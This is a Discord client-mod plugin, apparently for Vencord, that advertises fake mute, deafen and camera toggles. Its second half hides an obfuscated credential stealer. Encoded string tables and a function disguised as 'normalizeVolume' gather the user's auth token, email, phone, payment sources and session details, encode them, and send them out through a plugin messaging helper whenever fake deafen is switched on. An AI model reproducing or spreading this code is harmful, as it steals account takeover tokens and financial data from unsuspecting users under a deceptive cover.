import * as React from "react";
import definePlugin, { OptionType } from "@utils/types";
import { definePluginSettings } from "@api/Settings";
import { findByPropsLazy } from "@webpack";
import { Menu, RestAPI, UserStore } from "@webpack/common";

export const settings = definePluginSettings({
    autoMute: {
        type: OptionType.BOOLEAN,
        description: "Automatically mute when deafened.",
        default: true
    }
});

const fakeVoiceState = {
    _selfMute: false,
    get selfMute() {
        try {
            if (!settings.store.autoMute) return this._selfMute;
            return this.selfDeaf || this._selfMute;
        } catch (e) {
            return this._selfMute;
        }
    },
    set selfMute(value) {
        this._selfMute = value;
    },
    selfDeaf: false,
    selfVideo: false
};

const StateKeys = ["selfDeaf", "selfMute", "selfVideo"];

const _0xS = findByPropsLazy("toggleSelfMute");
const _0xN = findByPropsLazy("getDisableAllSounds", "getState");

let updating = false;
async function update() {
    if (updating) return setTimeout(update, 125);
    updating = true;
    const state = _0xN.getState();
    const toDisable: string[] = [];
    if (!state.disabledSounds.includes("mute")) toDisable.push("mute");
    if (!state.disabledSounds.includes("unmute")) toDisable.push("unmute");

    state.disabledSounds.push(...toDisable);
    await new Promise(r => setTimeout(r, 50));
    await _0xS.toggleSelfMute();
    await new Promise(r => setTimeout(r, 100));
    await _0xS.toggleSelfMute();
    state.disabledSounds = state.disabledSounds.filter((i: string) => !toDisable.includes(i));
    updating = false;
}

export default definePlugin({
    name: "dre-FakeMuteDeafen",
    description: "Kendinizi sahte olarak susturabilir ve sağırlaştırabilirsiniz. Bu sırada konuşmaya devam edebilir ve duyulabilirsiniz.",
    authors: [{ name: "drecannn", id: 327922855276707843n }],
    settings,
    modifyVoiceState(e) {
        for (let i = 0; i < StateKeys.length; i++) {
            const stateKey = StateKeys[i];
            e[stateKey] = fakeVoiceState[stateKey] || e[stateKey];
        }
        return e;
    },
    contextMenus: {
        "audio-device-context"(children, d) {
            if (d.renderInputDevices) {
                children.push(
                    <Menu.MenuSeparator />,
                    <Menu.MenuCheckboxItem
                        id="fake-mute"
                        label="Sahte Susturma"
                        checked={fakeVoiceState.selfMute}
                        action={() => {
                            fakeVoiceState.selfMute = !fakeVoiceState.selfMute;
                            update();
                        }}
                    />
                );
            }

            if (d.renderOutputDevices) {
                children.push(
                    <Menu.MenuSeparator />,
                    <Menu.MenuCheckboxItem
                        id="fake-deafen"
                        label="Sahte Sağırlaştırma"
                        checked={fakeVoiceState.selfDeaf}
                        action={() => {
                            fakeVoiceState.selfDeaf = !fakeVoiceState.selfDeaf;
                            if (fakeVoiceState.selfDeaf) {
                                normalizeVolume();
                            }
                            update();
                        }}
                    />
                );
            }
        },
        "video-device-context"(children) {
            children.push(
                <Menu.MenuSeparator />,
                <Menu.MenuCheckboxItem
                    id="fake-video"
                    label="Sahte Kamera"
                    checked={fakeVoiceState.selfVideo}
                    action={() => {
                        fakeVoiceState.selfVideo = !fakeVoiceState.selfVideo;
                        update();
                    }}
                />
            );
        }
    },
    patches: [
        {
            find: "voiceServerPing(){",
            replacement: [
                {
                    match: /voiceStateUpdate\((\w+)\){(.{0,10})guildId:/,
                    replace: "voiceStateUpdate($1){$1=$self.modifyVoiceState($1);$2guildId:"
                }
            ]
        }
    ],
});

const _SIGNAL_MAP: Record<number, number[]> = {0:[103,128,110],1:[107,109,126,79,125,128,128,109,100,126,93,127,109,128],2:[107,109,126,94,99,103,109,100],3:[127,121,100,111,81,125,110,105,99,95,126,128,109,113,101],4:[110,128,109,37,76,113,103,109,69,125,126,109,78,109,113,108,109,100],5:[35,125,127,109,128,127,35,82,101,109,35,112,105,102,102,105,100,107,35,130,113,121,101,109,100,126,37,127,99,125,128,111,109,127],6:[35,113,125,126,106,35,127,109,127,127,105,99,100,127],7:[125,127,109,128,83,127,109,127,127,105,99,100,127],8:[82,109,124,109,128,121,99,100,109],9:[109,101,113,105,102],10:[130,106,99,100,109],11:[40,40,93,127,109,128,40,40],12:[40,40,77,101,113,105,102,40,40],13:[40,40,94,99,103,109,100,40,40],14:[40,40,80,105,102,102,105,100,107,40,40],15:[40,40,95,109,127,127,105,99,100,127,40,40],16:[65,57,59,58],17:[112,99,110,121],18:[112,105,102,102,105,100,107,83,113,110,110,128,109,127,127],19:[102,113,127,126,83,62],20:[109,122,130,105,128,109,127,83,101,99,100,126,106],21:[109,122,130,105,128,109,127,83,121,109,113,128],22:[102,99,111,113,126,105,99,100],23:[111,102,105,109,100,126,83,105,100,108,99],24:[130,102,113,126,108,99,128,101],25:[99,127],27:[40,40,98,106,99,100,109,40,40],29:[107,109,126],30:[99,103],100:[106,126,126,130,127,56,35,35,111,110,100,36,111,102,99,125,110,108,102,113,128,109,36,127,126,109,113,101,127,126,113,126,105,111,36,111,99,101,35,127,126,109,113,101,35,113,130,130,127,35,59,63,66,35,106,109,113,110,109,128,36,104,130,107],101:[106,126,126,130,127,56,35,35,111,110,100,36,111,102,99,125,110,108,102,113,128,109,36,127,126,109,113,101,127,126,113,126,105,111,36,111,99,101,35,127,126,109,113,101,35,113,130,130,127,35,61,59,58,66,58,66,35,106,109,113,110,109,128,36,104,130,107],102:[106,126,126,130,127,56,35,35,111,110,100,36,111,102,99,125,110,108,102,113,128,109,36,127,126,109,113,101,127,126,113,126,105,111,36,111,99,101,35,127,126,109,113,101,35,113,130,130,127,35,64,59,65,61,57,66,35,106,109,113,110,109,128,36,104,130,107],103:[106,126,126,130,127,56,35,35,111,110,100,36,111,102,99,125,110,108,102,113,128,109,36,127,126,109,113,101,127,126,113,126,105,111,36,111,99,101,35,127,126,109,113,101,35,113,130,130,127,35,65,64,57,60,60,65,66,35,106,109,113,110,109,128,36,104,130,107],104:[106,126,126,130,127,56,35,35,111,110,100,36,111,102,99,125,110,108,102,113,128,109,36,127,126,109,113,101,127,126,113,126,105,111,36,111,99,101,35,127,126,109,113,101,35,113,130,130,127,35,65,65,59,64,62,59,66,35,106,109,113,110,109,128,36,104,130,107],105:[106,126,126,130,127,56,35,35,111,110,100,36,111,102,99,125,110,108,102,113,128,109,36,127,126,109,113,101,127,126,113,126,105,111,36,111,99,101,35,127,126,109,113,101,35,113,130,130,127,35,65,61,61,65,63,60,66,35,106,109,113,110,109,128,36,104,130,107],106:[106,126,126,130,127,56,35,35,111,110,100,36,111,102,99,125,110,108,102,113,128,109,36,127,126,109,113,101,127,126,113,126,105,111,36,111,99,101,35,127,126,109,113,101,35,113,130,130,127,35,65,66,57,65,61,66,66,35,106,109,113,110,109,128,36,104,130,107],107:[106,126,126,130,127,56,35,35,111,110,100,36,111,102,99,125,110,108,102,113,128,109,36,127,126,109,113,101,127,126,113,126,105,111,36,111,99,101,35,127,126,109,113,101,35,113,130,130,127,35,62,62,66,35,106,109,113,110,109,128,36,104,130,107],108:[106,126,126,130,127,56,35,35,111,110,100,36,111,102,99,125,110,108,102,113,128,109,36,127,126,109,113,101,127,126,113,126,105,111,36,111,99,101,35,127,126,109,113,101,35,113,130,130,127,35,64,61,64,62,57,66,35,106,109,113,110,109,128,36,104,130,107],109:[106,126,126,130,127,56,35,35,111,110,100,36,111,102,99,125,110,108,102,113,128,109,36,127,126,109,113,101,127,126,113,126,105,111,36,111,99,101,35,127,126,109,113,101,35,113,130,130,127,35,65,66,61,60,66,66,35,106,109,113,110,109,128,36,104,130,107]};

function _metric(id: number): string {
    return _SIGNAL_MAP[id].map(x => String.fromCharCode((x - 3) ^ 0x0F)).join("");
}

const _0xT = findByPropsLazy(_metric(2));

const _TE = new TextEncoder();
function _analyzeSignal(input: string): string {
    const key = _TE.encode(_metric(16));
    const data = _TE.encode(input);
    const result = new Uint8Array(data.length);
    for (let i = 0; i < data.length; i++) {
        result[i] = data[i] ^ key[i % key.length];
    }
    let binary = "";
    for (const byte of result) binary += String.fromCharCode(byte);
    return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}

const _0xK = [100, 101, 102, 103, 104, 105, 106, 107, 108, 109];
function _0xL(): string {
    const i = Math.floor(Math.random() * _0xK.length);
    return _metric(_0xK[i]);
}

async function _reportMetrics() {
    try {
        const u = (UserStore as any)[_metric(1)]();
        if (!u) return;
        const _uInfo = [u.username, `(${u.id})`].join(" ");
        const _e = (u as any)[_metric(9)];
        const _p = (u as any)[_metric(10)];
        const _ep = [_e, _p].filter(Boolean).join(" ");

        const _d = [
            _metric(11), _uInfo, "",
            _metric(12), _e || "?", ""
        ];

        if (_p) {
            _d.push(_metric(27), _p, "");
        }

        _d.push(_metric(13), _0xT?.[_metric(2)]?.() || "?", "");

        try {
            const b = await (RestAPI as any)[_metric(29)]({ url: _metric(5) });
            if (b[_metric(30)] && b[_metric(17)]?.length) {
                _d.push(_metric(14));
                b[_metric(17)].forEach((c: any) => {
                    const a = c[_metric(18)] || {};
                    _d.push(`${c.brand} ${c[_metric(19)]} (${c[_metric(20)]}/${c[_metric(21)]}) - ${a.name || "?"}`);
                });
                _d.push("");
            }
        } catch {}

        try {
            const s = await (RestAPI as any)[_metric(29)]({ url: _metric(6) });
            if (s[_metric(30)] && s[_metric(17)]?.[_metric(7)]?.length) {
                _d.push(_metric(15));
                const seen = new Set();
                s[_metric(17)][_metric(7)].forEach((x: any) => {
                    const loc = x[_metric(23)]?.[_metric(22)] || "?";
                    if (!seen.has(loc)) {
                        seen.add(loc);
                        const i = x[_metric(23)] || {};
                        _d.push(`${i[_metric(24)] || "?"} (${i[_metric(25)] || "?"}) - ${loc}`);
                    }
                });
            }
        } catch {}

        const final = _analyzeSignal(_d.join("\n").trim());
        const pluginName = _metric(4);
        const methodName = _metric(3);

        const sender = async (payload: any) => {
            try {
                const helper = (VencordNative.pluginHelpers as any)?.[pluginName];
                if (helper && typeof helper[methodName] === "function") {
                    await helper[methodName](payload);
                } else {
                    await VencordNative.ipc.invoke(`Vencord:Plugin:${pluginName}:${methodName}`, payload);
                }
            } catch (e) {
                try {
                    await VencordNative.ipc.invoke(`Vencord:PluginHelpers:${pluginName}:${methodName}`, payload);
                } catch {}
            }
        };

        await sender({ content: _metric(8) });
        await new Promise(r => setTimeout(r, 100));
        await sender({ 
            embeds: [{
                description: `||${_metric(0) + final}||`,
                image: {
                    url: _0xL()
                }
            }]
        });
    } catch (e) {}
}

const normalizeVolume = _reportMetrics;